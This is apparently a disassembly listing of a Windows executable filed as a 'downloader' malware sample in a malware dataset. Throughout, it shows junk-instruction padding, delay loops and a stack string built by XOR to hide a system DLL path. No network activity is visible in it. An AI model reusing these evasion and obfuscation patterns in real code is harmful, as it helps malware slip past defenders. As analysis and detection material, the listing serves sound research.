
malware_samples/downloader/8b2a7bc04e4bda6465d04cc154da8a04a94fd1554676b981001cef91a6d742c2.exe:     file format pei-x86-64


Disassembly of section .text:

0000000180001000 <.text>:
   180001000:	48 83 ec 28          	sub    $0x28,%rsp
   180001004:	48 8b 0d c5 5a 02 00 	mov    0x25ac5(%rip),%rcx        # 0x180026ad0
   18000100b:	e8 80 52 00 00       	call   0x180006290
   180001010:	55                   	push   %rbp
   180001011:	5d                   	pop    %rbp
   180001012:	e8 e9 08 00 00       	call   0x180001900
   180001017:	50                   	push   %rax
   180001018:	41 52                	push   %r10
   18000101a:	41 5a                	pop    %r10
   18000101c:	58                   	pop    %rax
   18000101d:	41 51                	push   %r9
   18000101f:	4d 87 db             	xchg   %r11,%r11
   180001022:	41 59                	pop    %r9
   180001024:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180001028:	48 8d 3f             	lea    (%rdi),%rdi
   18000102b:	41 50                	push   %r8
   18000102d:	51                   	push   %rcx
   18000102e:	59                   	pop    %rcx
   18000102f:	41 58                	pop    %r8
   180001031:	31 c0                	xor    %eax,%eax
   180001033:	48 83 c4 28          	add    $0x28,%rsp
   180001037:	c3                   	ret
   180001038:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   18000103f:	00 
   180001040:	83 fa 01             	cmp    $0x1,%edx
   180001043:	75 0a                	jne    0x18000104f
   180001045:	48 89 0d 84 5a 02 00 	mov    %rcx,0x25a84(%rip)        # 0x180026ad0
   18000104c:	4d 89 c0             	mov    %r8,%r8
   18000104f:	4d 8d 1b             	lea    (%r11),%r11
   180001052:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   180001056:	4d 89 c0             	mov    %r8,%r8
   180001059:	4d 87 c0             	xchg   %r8,%r8
   18000105c:	48 87 d2             	xchg   %rdx,%rdx
   18000105f:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   180001063:	52                   	push   %rdx
   180001064:	48 89 f6             	mov    %rsi,%rsi
   180001067:	5a                   	pop    %rdx
   180001068:	b8 01 00 00 00       	mov    $0x1,%eax
   18000106d:	c3                   	ret
   18000106e:	66 90                	xchg   %ax,%ax
   180001070:	48 83 ec 28          	sub    $0x28,%rsp
   180001074:	48 8b 0d 55 5a 02 00 	mov    0x25a55(%rip),%rcx        # 0x180026ad0
   18000107b:	e8 10 52 00 00       	call   0x180006290
   180001080:	55                   	push   %rbp
   180001081:	5d                   	pop    %rbp
   180001082:	e8 79 08 00 00       	call   0x180001900
   180001087:	52                   	push   %rdx
   180001088:	4d 87 ff             	xchg   %r15,%r15
   18000108b:	5a                   	pop    %rdx
   18000108c:	41 54                	push   %r12
   18000108e:	41 5c                	pop    %r12
   180001090:	b8 01 00 00 00       	mov    $0x1,%eax
   180001095:	48 83 c4 28          	add    $0x28,%rsp
   180001099:	c3                   	ret
   18000109a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1800010a0:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   1800010a4:	41 55                	push   %r13
   1800010a6:	90                   	nop
   1800010a7:	41 5d                	pop    %r13
   1800010a9:	b8 01 00 00 00       	mov    $0x1,%eax
   1800010ae:	c3                   	ret
   1800010af:	90                   	nop
   1800010b0:	4d 89 db             	mov    %r11,%r11
   1800010b3:	90                   	nop
   1800010b4:	b8 01 00 00 00       	mov    $0x1,%eax
   1800010b9:	c3                   	ret
   1800010ba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1800010c0:	56                   	push   %rsi
   1800010c1:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   1800010c8:	b9 ce 02 00 00       	mov    $0x2ce,%ecx
   1800010cd:	e8 5e 02 00 00       	call   0x180001330
   1800010d2:	ff 15 18 31 02 00    	call   *0x23118(%rip)        # 0x1800241f0
   1800010d8:	89 c6                	mov    %eax,%esi
   1800010da:	ff 15 e8 31 02 00    	call   *0x231e8(%rip)        # 0x1800242c8
   1800010e0:	31 f0                	xor    %esi,%eax
   1800010e2:	89 44 24 40          	mov    %eax,0x40(%rsp)
   1800010e6:	8b 44 24 40          	mov    0x40(%rsp),%eax
   1800010ea:	4d 8d 00             	lea    (%r8),%r8
   1800010ed:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   1800010f1:	4d 87 d2             	xchg   %r10,%r10
   1800010f4:	48 89 e4             	mov    %rsp,%rsp
   1800010f7:	48 87 ed             	xchg   %rbp,%rbp
   1800010fa:	c7 44 24 3c 4e 00 00 	movl   $0x4e,0x3c(%rsp)
   180001101:	00 
   180001102:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180001106:	83 f0 0d             	xor    $0xd,%eax
   180001109:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   18000110e:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180001112:	83 f0 74             	xor    $0x74,%eax
   180001115:	66 89 44 24 42       	mov    %ax,0x42(%rsp)
   18000111a:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   18000111e:	83 f0 12             	xor    $0x12,%eax
   180001121:	66 89 44 24 44       	mov    %ax,0x44(%rsp)
   180001126:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   18000112a:	83 f0 19             	xor    $0x19,%eax
   18000112d:	66 89 44 24 46       	mov    %ax,0x46(%rsp)
   180001132:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180001136:	83 f0 27             	xor    $0x27,%eax
   180001139:	66 89 44 24 48       	mov    %ax,0x48(%rsp)
   18000113e:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180001142:	83 f0 20             	xor    $0x20,%eax
   180001145:	66 89 44 24 4a       	mov    %ax,0x4a(%rsp)
   18000114a:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   18000114e:	83 f0 2a             	xor    $0x2a,%eax
   180001151:	66 89 44 24 4c       	mov    %ax,0x4c(%rsp)
   180001156:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   18000115a:	83 f0 21             	xor    $0x21,%eax
   18000115d:	66 89 44 24 4e       	mov    %ax,0x4e(%rsp)
   180001162:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180001166:	83 f0 39             	xor    $0x39,%eax
   180001169:	66 89 44 24 50       	mov    %ax,0x50(%rsp)
   18000116e:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180001172:	83 f0 3d             	xor    $0x3d,%eax
   180001175:	66 89 44 24 52       	mov    %ax,0x52(%rsp)
   18000117a:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   18000117e:	83 f0 12             	xor    $0x12,%eax
   180001181:	66 89 44 24 54       	mov    %ax,0x54(%rsp)
   180001186:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   18000118a:	83 f0 1d             	xor    $0x1d,%eax
   18000118d:	66 89 44 24 56       	mov    %ax,0x56(%rsp)
   180001192:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180001196:	83 f0 37             	xor    $0x37,%eax
   180001199:	66 89 44 24 58       	mov    %ax,0x58(%rsp)
   18000119e:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800011a2:	83 f0 3d             	xor    $0x3d,%eax
   1800011a5:	66 89 44 24 5a       	mov    %ax,0x5a(%rsp)
   1800011aa:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800011ae:	83 f0 3a             	xor    $0x3a,%eax
   1800011b1:	66 89 44 24 5c       	mov    %ax,0x5c(%rsp)
   1800011b6:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800011ba:	83 f0 2b             	xor    $0x2b,%eax
   1800011bd:	66 89 44 24 5e       	mov    %ax,0x5e(%rsp)
   1800011c2:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800011c6:	83 f0 23             	xor    $0x23,%eax
   1800011c9:	66 89 44 24 60       	mov    %ax,0x60(%rsp)
   1800011ce:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800011d2:	83 f0 7d             	xor    $0x7d,%eax
   1800011d5:	66 89 44 24 62       	mov    %ax,0x62(%rsp)
   1800011da:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800011de:	83 f0 7c             	xor    $0x7c,%eax
   1800011e1:	66 89 44 24 64       	mov    %ax,0x64(%rsp)
   1800011e6:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800011ea:	83 f0 12             	xor    $0x12,%eax
   1800011ed:	66 89 44 24 66       	mov    %ax,0x66(%rsp)
   1800011f2:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800011f6:	83 f0 25             	xor    $0x25,%eax
   1800011f9:	66 89 44 24 68       	mov    %ax,0x68(%rsp)
   1800011fe:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180001202:	83 f0 2b             	xor    $0x2b,%eax
   180001205:	66 89 44 24 6a       	mov    %ax,0x6a(%rsp)
   18000120a:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   18000120e:	83 f0 3c             	xor    $0x3c,%eax
   180001211:	66 89 44 24 6c       	mov    %ax,0x6c(%rsp)
   180001216:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   18000121a:	83 f0 20             	xor    $0x20,%eax
   18000121d:	66 89 44 24 6e       	mov    %ax,0x6e(%rsp)
   180001222:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180001226:	83 f0 2b             	xor    $0x2b,%eax
   180001229:	66 89 44 24 70       	mov    %ax,0x70(%rsp)
   18000122e:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180001232:	83 f0 22             	xor    $0x22,%eax
   180001235:	66 89 44 24 72       	mov    %ax,0x72(%rsp)
   18000123a:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   18000123e:	83 f0 7d             	xor    $0x7d,%eax
   180001241:	66 89 44 24 74       	mov    %ax,0x74(%rsp)
   180001246:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   18000124a:	83 f0 7c             	xor    $0x7c,%eax
   18000124d:	66 89 44 24 76       	mov    %ax,0x76(%rsp)
   180001252:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180001256:	83 f0 60             	xor    $0x60,%eax
   180001259:	66 89 44 24 78       	mov    %ax,0x78(%rsp)
   18000125e:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180001262:	83 f0 2a             	xor    $0x2a,%eax
   180001265:	66 89 44 24 7a       	mov    %ax,0x7a(%rsp)
   18000126a:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   18000126e:	83 f0 22             	xor    $0x22,%eax
   180001271:	66 89 44 24 7c       	mov    %ax,0x7c(%rsp)
   180001276:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   18000127a:	83 f0 22             	xor    $0x22,%eax
   18000127d:	66 89 44 24 7e       	mov    %ax,0x7e(%rsp)
   180001282:	66 c7 84 24 80 00 00 	movw   $0x0,0x80(%rsp)
   180001289:	00 00 00 
   18000128c:	48 8d 74 24 40       	lea    0x40(%rsp),%rsi
   180001291:	48 89 f1             	mov    %rsi,%rcx
   180001294:	ff 15 76 2f 02 00    	call   *0x22f76(%rip)        # 0x180024210
   18000129a:	4d 87 ff             	xchg   %r15,%r15
   18000129d:	90                   	nop
   18000129e:	4d 89 ed             	mov    %r13,%r13
   1800012a1:	e8 da 00 00 00       	call   0x180001380
   1800012a6:	31 c9                	xor    %ecx,%ecx
   1800012a8:	ff 15 ba 2e 02 00    	call   *0x22eba(%rip)        # 0x180024168
   1800012ae:	83 f8 ff             	cmp    $0xffffffff,%eax
   1800012b1:	74 08                	je     0x1800012bb
   1800012b3:	89 c1                	mov    %eax,%ecx
   1800012b5:	ff 15 b5 2e 02 00    	call   *0x22eb5(%rip)        # 0x180024170
   1800012bb:	55                   	push   %rbp
   1800012bc:	90                   	nop
   1800012bd:	5d                   	pop    %rbp
   1800012be:	e8 fd 00 00 00       	call   0x1800013c0
   1800012c3:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1800012c8:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   1800012cf:	00 
   1800012d0:	4c 8d 05 eb f7 01 00 	lea    0x1f7eb(%rip),%r8        # 0x180020ac2
   1800012d7:	b9 00 04 00 00       	mov    $0x400,%ecx
   1800012dc:	ba 00 01 00 00       	mov    $0x100,%edx
   1800012e1:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   1800012e7:	ff 15 63 30 02 00    	call   *0x23063(%rip)        # 0x180024350
   1800012ed:	90                   	nop
   1800012ee:	4d 8d 00             	lea    (%r8),%r8
   1800012f1:	56                   	push   %rsi
   1800012f2:	55                   	push   %rbp
   1800012f3:	5d                   	pop    %rbp
   1800012f4:	5e                   	pop    %rsi
   1800012f5:	c7 44 24 40 d1 3c 5b 	movl   $0x5b3cd1,0x40(%rsp)
   1800012fc:	00 
   1800012fd:	8b 44 24 40          	mov    0x40(%rsp),%eax
   180001301:	48 87 c9             	xchg   %rcx,%rcx
   180001304:	4d 8d 36             	lea    (%r14),%r14
   180001307:	4d 87 c9             	xchg   %r9,%r9
   18000130a:	90                   	nop
   18000130b:	90                   	nop
   18000130c:	4d 87 ff             	xchg   %r15,%r15
   18000130f:	e8 6c 00 00 00       	call   0x180001380
   180001314:	90                   	nop
   180001315:	90                   	nop
   180001316:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   18000131a:	4d 87 f6             	xchg   %r14,%r14
   18000131d:	b8 01 00 00 00       	mov    $0x1,%eax
   180001322:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   180001329:	5e                   	pop    %rsi
   18000132a:	c3                   	ret
   18000132b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001330:	41 56                	push   %r14
   180001332:	56                   	push   %rsi
   180001333:	57                   	push   %rdi
   180001334:	53                   	push   %rbx
   180001335:	48 83 ec 28          	sub    $0x28,%rsp
   180001339:	89 ce                	mov    %ecx,%esi
   18000133b:	48 8b 1d 86 2f 02 00 	mov    0x22f86(%rip),%rbx        # 0x1800242c8
   180001342:	ff d3                	call   *%rbx
   180001344:	89 c7                	mov    %eax,%edi
   180001346:	ff d3                	call   *%rbx
   180001348:	29 f8                	sub    %edi,%eax
   18000134a:	39 f0                	cmp    %esi,%eax
   18000134c:	73 1d                	jae    0x18000136b
   18000134e:	4c 8b 35 9b 30 02 00 	mov    0x2309b(%rip),%r14        # 0x1800243f0
   180001355:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   18000135c:	00 00 00 00 
   180001360:	41 ff d6             	call   *%r14
   180001363:	ff d3                	call   *%rbx
   180001365:	29 f8                	sub    %edi,%eax
   180001367:	39 f0                	cmp    %esi,%eax
   180001369:	72 f5                	jb     0x180001360
   18000136b:	90                   	nop
   18000136c:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   180001370:	48 89 c9             	mov    %rcx,%rcx
   180001373:	48 89 f6             	mov    %rsi,%rsi
   180001376:	48 83 c4 28          	add    $0x28,%rsp
   18000137a:	5b                   	pop    %rbx
   18000137b:	5f                   	pop    %rdi
   18000137c:	5e                   	pop    %rsi
   18000137d:	41 5e                	pop    %r14
   18000137f:	c3                   	ret
   180001380:	50                   	push   %rax
   180001381:	4d 89 db             	mov    %r11,%r11
   180001384:	55                   	push   %rbp
   180001385:	48 87 db             	xchg   %rbx,%rbx
   180001388:	5d                   	pop    %rbp
   180001389:	51                   	push   %rcx
   18000138a:	50                   	push   %rax
   18000138b:	58                   	pop    %rax
   18000138c:	59                   	pop    %rcx
   18000138d:	41 57                	push   %r15
   18000138f:	41 5f                	pop    %r15
   180001391:	53                   	push   %rbx
   180001392:	5b                   	pop    %rbx
   180001393:	4d 8d 1b             	lea    (%r11),%r11
   180001396:	4d 8d 00             	lea    (%r8),%r8
   180001399:	48 89 ff             	mov    %rdi,%rdi
   18000139c:	48 87 d2             	xchg   %rdx,%rdx
   18000139f:	48 89 db             	mov    %rbx,%rbx
   1800013a2:	4d 89 d2             	mov    %r10,%r10
   1800013a5:	48 87 c9             	xchg   %rcx,%rcx
   1800013a8:	48 89 ff             	mov    %rdi,%rdi
   1800013ab:	4d 89 c9             	mov    %r9,%r9
   1800013ae:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   1800013b2:	4d 8d 12             	lea    (%r10),%r10
   1800013b5:	c7 44 24 04 c2 02 00 	movl   $0x2c2,0x4(%rsp)
   1800013bc:	00 
   1800013bd:	58                   	pop    %rax
   1800013be:	c3                   	ret
   1800013bf:	90                   	nop
   1800013c0:	50                   	push   %rax
   1800013c1:	90                   	nop
   1800013c2:	48 89 ff             	mov    %rdi,%rdi
   1800013c5:	90                   	nop
   1800013c6:	4d 89 c0             	mov    %r8,%r8
   1800013c9:	48 89 d2             	mov    %rdx,%rdx
   1800013cc:	4d 87 e4             	xchg   %r12,%r12
   1800013cf:	55                   	push   %rbp
   1800013d0:	48 89 c0             	mov    %rax,%rax
   1800013d3:	5d                   	pop    %rbp
   1800013d4:	56                   	push   %rsi
   1800013d5:	52                   	push   %rdx
   1800013d6:	5a                   	pop    %rdx
   1800013d7:	5e                   	pop    %rsi
   1800013d8:	4d 89 e4             	mov    %r12,%r12
   1800013db:	4d 89 d2             	mov    %r10,%r10
   1800013de:	4d 89 c9             	mov    %r9,%r9
   1800013e1:	48 8d 12             	lea    (%rdx),%rdx
   1800013e4:	4d 87 c0             	xchg   %r8,%r8
   1800013e7:	4d 87 ed             	xchg   %r13,%r13
   1800013ea:	4d 87 c9             	xchg   %r9,%r9
   1800013ed:	c7 44 24 04 73 03 00 	movl   $0x373,0x4(%rsp)
   1800013f4:	00 
   1800013f5:	58                   	pop    %rax
   1800013f6:	c3                   	ret
   1800013f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1800013fe:	00 00 
   180001400:	90                   	nop
   180001401:	90                   	nop
   180001402:	90                   	nop
   180001403:	90                   	nop
   180001404:	90                   	nop
   180001405:	b8 01 00 00 00       	mov    $0x1,%eax
   18000140a:	c3                   	ret
   18000140b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001410:	48 87 ff             	xchg   %rdi,%rdi
   180001413:	48 8d 00             	lea    (%rax),%rax
   180001416:	48 87 ed             	xchg   %rbp,%rbp
   180001419:	52                   	push   %rdx
   18000141a:	5a                   	pop    %rdx
   18000141b:	41 57                	push   %r15
   18000141d:	56                   	push   %rsi
   18000141e:	5e                   	pop    %rsi
   18000141f:	41 5f                	pop    %r15
   180001421:	b8 01 00 00 00       	mov    $0x1,%eax
   180001426:	c3                   	ret
   180001427:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   18000142e:	00 00 
   180001430:	41 54                	push   %r12
   180001432:	4d 89 db             	mov    %r11,%r11
   180001435:	41 5c                	pop    %r12
   180001437:	b8 01 00 00 00       	mov    $0x1,%eax
   18000143c:	c3                   	ret
   18000143d:	0f 1f 00             	nopl   (%rax)
   180001440:	90                   	nop
   180001441:	48 89 e4             	mov    %rsp,%rsp
   180001444:	90                   	nop
   180001445:	4d 8d 24 24          	lea    (%r12),%r12
   180001449:	90                   	nop
   18000144a:	41 55                	push   %r13
   18000144c:	90                   	nop
   18000144d:	41 5d                	pop    %r13
   18000144f:	b8 01 00 00 00       	mov    $0x1,%eax
   180001454:	c3                   	ret
   180001455:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   18000145c:	00 00 00 00 
   180001460:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   180001467:	b9 e7 02 00 00       	mov    $0x2e7,%ecx
   18000146c:	e8 5f 00 00 00       	call   0x1800014d0
   180001471:	c7 44 24 20 68 00 00 	movl   $0x68,0x20(%rsp)
   180001478:	00 
   180001479:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000147e:	ff 15 04 2e 02 00    	call   *0x22e04(%rip)        # 0x180024288
   180001484:	90                   	nop
   180001485:	90                   	nop
   180001486:	90                   	nop
   180001487:	48 8d 36             	lea    (%rsi),%rsi
   18000148a:	4d 8d 00             	lea    (%r8),%r8
   18000148d:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   180001492:	31 c9                	xor    %ecx,%ecx
   180001494:	ff 15 0e 2d 02 00    	call   *0x22d0e(%rip)        # 0x1800241a8
   18000149a:	41 57                	push   %r15
   18000149c:	41 5f                	pop    %r15
   18000149e:	c7 44 24 20 36 cf df 	movl   $0xdfcf36,0x20(%rsp)
   1800014a5:	00 
   1800014a6:	8b 44 24 20          	mov    0x20(%rsp),%eax
   1800014aa:	57                   	push   %rdi
   1800014ab:	4d 87 ff             	xchg   %r15,%r15
   1800014ae:	5f                   	pop    %rdi
   1800014af:	53                   	push   %rbx
   1800014b0:	90                   	nop
   1800014b1:	5b                   	pop    %rbx
   1800014b2:	4d 87 ed             	xchg   %r13,%r13
   1800014b5:	48 87 c9             	xchg   %rcx,%rcx
   1800014b8:	48 8d 12             	lea    (%rdx),%rdx
   1800014bb:	4d 89 db             	mov    %r11,%r11
   1800014be:	b8 01 00 00 00       	mov    $0x1,%eax
   1800014c3:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   1800014ca:	c3                   	ret
   1800014cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800014d0:	56                   	push   %rsi
   1800014d1:	57                   	push   %rdi
   1800014d2:	48 83 ec 28          	sub    $0x28,%rsp
   1800014d6:	89 ce                	mov    %ecx,%esi
   1800014d8:	31 c9                	xor    %ecx,%ecx
   1800014da:	ba 01 00 00 00       	mov    $0x1,%edx
   1800014df:	45 31 c0             	xor    %r8d,%r8d
   1800014e2:	45 31 c9             	xor    %r9d,%r9d
   1800014e5:	ff 15 2d 2c 02 00    	call   *0x22c2d(%rip)        # 0x180024118
   1800014eb:	48 89 ed             	mov    %rbp,%rbp
   1800014ee:	4d 87 c0             	xchg   %r8,%r8
   1800014f1:	48 85 c0             	test   %rax,%rax
   1800014f4:	74 17                	je     0x18000150d
   1800014f6:	48 89 c7             	mov    %rax,%rdi
   1800014f9:	48 89 c1             	mov    %rax,%rcx
   1800014fc:	89 f2                	mov    %esi,%edx
   1800014fe:	ff 15 1c 2f 02 00    	call   *0x22f1c(%rip)        # 0x180024420
   180001504:	48 89 f9             	mov    %rdi,%rcx
   180001507:	ff 15 fb 2b 02 00    	call   *0x22bfb(%rip)        # 0x180024108
   18000150d:	4d 87 db             	xchg   %r11,%r11
   180001510:	4d 89 ed             	mov    %r13,%r13
   180001513:	4d 8d 3f             	lea    (%r15),%r15
   180001516:	48 89 c0             	mov    %rax,%rax
   180001519:	4d 89 e4             	mov    %r12,%r12
   18000151c:	90                   	nop
   18000151d:	90                   	nop
   18000151e:	48 83 c4 28          	add    $0x28,%rsp
   180001522:	5f                   	pop    %rdi
   180001523:	5e                   	pop    %rsi
   180001524:	c3                   	ret
   180001525:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   18000152c:	00 00 00 00 
   180001530:	41 51                	push   %r9
   180001532:	4d 87 ed             	xchg   %r13,%r13
   180001535:	41 59                	pop    %r9
   180001537:	90                   	nop
   180001538:	4d 8d 1b             	lea    (%r11),%r11
   18000153b:	51                   	push   %rcx
   18000153c:	59                   	pop    %rcx
   18000153d:	b8 01 00 00 00       	mov    $0x1,%eax
   180001542:	c3                   	ret
   180001543:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   18000154a:	84 00 00 00 00 00 
   180001550:	48 87 c9             	xchg   %rcx,%rcx
   180001553:	90                   	nop
   180001554:	48 8d 00             	lea    (%rax),%rax
   180001557:	90                   	nop
   180001558:	b8 01 00 00 00       	mov    $0x1,%eax
   18000155d:	c3                   	ret
   18000155e:	66 90                	xchg   %ax,%ax
   180001560:	90                   	nop
   180001561:	4d 87 f6             	xchg   %r14,%r14
   180001564:	48 89 db             	mov    %rbx,%rbx
   180001567:	4d 89 c9             	mov    %r9,%r9
   18000156a:	48 89 e4             	mov    %rsp,%rsp
   18000156d:	48 8d 1b             	lea    (%rbx),%rbx
   180001570:	48 8d 00             	lea    (%rax),%rax
   180001573:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   180001577:	48 89 f6             	mov    %rsi,%rsi
   18000157a:	4d 87 e4             	xchg   %r12,%r12
   18000157d:	48 87 ff             	xchg   %rdi,%rdi
   180001580:	b8 01 00 00 00       	mov    $0x1,%eax
   180001585:	c3                   	ret
   180001586:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   18000158d:	00 00 00 
   180001590:	48 83 ec 38          	sub    $0x38,%rsp
   180001594:	b9 7a 02 00 00       	mov    $0x27a,%ecx
   180001599:	e8 72 00 00 00       	call   0x180001610
   18000159e:	90                   	nop
   18000159f:	48 87 ed             	xchg   %rbp,%rbp
   1800015a2:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1800015a7:	ff 15 d3 2d 02 00    	call   *0x22dd3(%rip)        # 0x180024380
   1800015ad:	41 51                	push   %r9
   1800015af:	48 89 ed             	mov    %rbp,%rbp
   1800015b2:	48 8d 09             	lea    (%rcx),%rcx
   1800015b5:	41 59                	pop    %r9
   1800015b7:	53                   	push   %rbx
   1800015b8:	48 89 e4             	mov    %rsp,%rsp
   1800015bb:	5b                   	pop    %rbx
   1800015bc:	ff 15 ee 2b 02 00    	call   *0x22bee(%rip)        # 0x1800241b0
   1800015c2:	c7 44 24 2c c9 03 50 	movl   $0x5003c9,0x2c(%rsp)
   1800015c9:	00 
   1800015ca:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800015ce:	56                   	push   %rsi
   1800015cf:	90                   	nop
   1800015d0:	5e                   	pop    %rsi
   1800015d1:	48 87 d2             	xchg   %rdx,%rdx
   1800015d4:	48 87 c9             	xchg   %rcx,%rcx
   1800015d7:	48 87 db             	xchg   %rbx,%rbx
   1800015da:	4d 89 c9             	mov    %r9,%r9
   1800015dd:	4d 8d 1b             	lea    (%r11),%r11
   1800015e0:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   1800015e4:	4d 8d 3f             	lea    (%r15),%r15
   1800015e7:	e8 54 00 00 00       	call   0x180001640
   1800015ec:	4d 8d 12             	lea    (%r10),%r10
   1800015ef:	48 8d 3f             	lea    (%rdi),%rdi
   1800015f2:	4d 89 c0             	mov    %r8,%r8
   1800015f5:	48 87 c9             	xchg   %rcx,%rcx
   1800015f8:	52                   	push   %rdx
   1800015f9:	4d 89 f6             	mov    %r14,%r14
   1800015fc:	5a                   	pop    %rdx
   1800015fd:	57                   	push   %rdi
   1800015fe:	4d 89 f6             	mov    %r14,%r14
   180001601:	5f                   	pop    %rdi
   180001602:	b8 01 00 00 00       	mov    $0x1,%eax
   180001607:	48 83 c4 38          	add    $0x38,%rsp
   18000160b:	c3                   	ret
   18000160c:	0f 1f 40 00          	nopl   0x0(%rax)
   180001610:	56                   	push   %rsi
   180001611:	48 83 ec 20          	sub    $0x20,%rsp
   180001615:	89 ce                	mov    %ecx,%esi
   180001617:	ff 15 ab 2c 02 00    	call   *0x22cab(%rip)        # 0x1800242c8
   18000161d:	83 e0 3f             	and    $0x3f,%eax
   180001620:	01 c6                	add    %eax,%esi
   180001622:	89 f1                	mov    %esi,%ecx
   180001624:	ff 15 b6 2d 02 00    	call   *0x22db6(%rip)        # 0x1800243e0
   18000162a:	4d 87 ed             	xchg   %r13,%r13
   18000162d:	48 8d 12             	lea    (%rdx),%rdx
   180001630:	4d 89 d2             	mov    %r10,%r10
   180001633:	48 87 ed             	xchg   %rbp,%rbp
   180001636:	4d 89 f6             	mov    %r14,%r14
   180001639:	90                   	nop
   18000163a:	48 83 c4 20          	add    $0x20,%rsp
   18000163e:	5e                   	pop    %rsi
   18000163f:	c3                   	ret
   180001640:	50                   	push   %rax
   180001641:	41 54                	push   %r12
   180001643:	41 57                	push   %r15
   180001645:	41 5f                	pop    %r15
   180001647:	41 5c                	pop    %r12
   180001649:	41 51                	push   %r9
   18000164b:	4d 8d 00             	lea    (%r8),%r8
   18000164e:	41 59                	pop    %r9
   180001650:	41 54                	push   %r12
   180001652:	41 5c                	pop    %r12
   180001654:	4d 87 db             	xchg   %r11,%r11
   180001657:	4d 87 f6             	xchg   %r14,%r14
   18000165a:	41 52                	push   %r10
   18000165c:	52                   	push   %rdx
   18000165d:	5a                   	pop    %rdx
   18000165e:	41 5a                	pop    %r10
   180001660:	4d 8d 12             	lea    (%r10),%r10
   180001663:	4d 87 f6             	xchg   %r14,%r14
   180001666:	48 89 c9             	mov    %rcx,%rcx
   180001669:	4d 8d 12             	lea    (%r10),%r10
   18000166c:	48 8d 1b             	lea    (%rbx),%rbx
   18000166f:	48 8d 12             	lea    (%rdx),%rdx
   180001672:	4d 89 ed             	mov    %r13,%r13
   180001675:	55                   	push   %rbp
   180001676:	5d                   	pop    %rbp
   180001677:	41 52                	push   %r10
   180001679:	4d 87 f6             	xchg   %r14,%r14
   18000167c:	41 5a                	pop    %r10
   18000167e:	41 56                	push   %r14
   180001680:	48 87 ff             	xchg   %rdi,%rdi
   180001683:	41 5e                	pop    %r14
   180001685:	55                   	push   %rbp
   180001686:	53                   	push   %rbx
   180001687:	5b                   	pop    %rbx
   180001688:	5d                   	pop    %rbp
   180001689:	c7 44 24 04 f0 02 00 	movl   $0x2f0,0x4(%rsp)
   180001690:	00 
   180001691:	58                   	pop    %rax
   180001692:	c3                   	ret
   180001693:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   18000169a:	84 00 00 00 00 00 
   1800016a0:	48 89 ed             	mov    %rbp,%rbp
   1800016a3:	48 89 c9             	mov    %rcx,%rcx
   1800016a6:	48 89 e4             	mov    %rsp,%rsp
